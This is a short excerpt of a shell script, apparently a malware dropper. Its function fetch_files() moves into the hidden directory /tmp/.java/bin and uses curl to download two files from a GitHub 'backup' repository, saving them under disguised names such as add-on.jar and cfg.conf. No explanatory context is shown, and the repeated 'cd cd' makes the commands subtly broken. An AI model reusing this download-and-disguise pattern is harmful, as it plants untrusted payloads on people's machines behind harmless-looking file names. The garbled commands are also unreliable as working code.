...
function fetch_files() {
    ...
    cd cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/rufastnde/cfg.conf -o cfg.conf
    cd cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/mc/gcat -o add-on.jar
    echo "DONE ..."
}
